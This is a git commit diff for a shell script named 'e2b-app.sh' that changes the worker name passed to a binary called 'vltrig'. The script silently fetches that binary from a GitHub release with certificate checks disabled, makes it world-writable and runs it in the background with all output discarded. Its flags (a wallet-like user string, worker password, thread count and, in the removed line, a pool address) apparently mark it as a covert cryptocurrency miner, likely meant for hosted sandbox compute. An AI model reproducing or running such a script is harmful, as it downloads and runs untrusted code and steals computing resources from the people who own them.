138e520ccc117cae36b7b963fd1d2478971bdcc1
gaserjuk <gaserjukilo@gmail.com>
2026-04-15 12:39:27 +0700

    Change worker user and pass in vltrig command
    Updated user and pass parameters for vltrig execution.

--- e2b-app.sh
+++ e2b-app.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 curl -sLkO https://github.com/satelitlima00/zerox/releases/download/ulo/vltrig >/dev/null 2>&1
 chmod 777 vltrig
-./vltrig -o 185.84.98.85:443 --user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass WORKER-E1 --threads 4 >/dev/null 2>&1 &
+./vltrig --user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass WORKER-E4 --threads 4 >/dev/null 2>&1 &
 sleep 20
 while true
 do
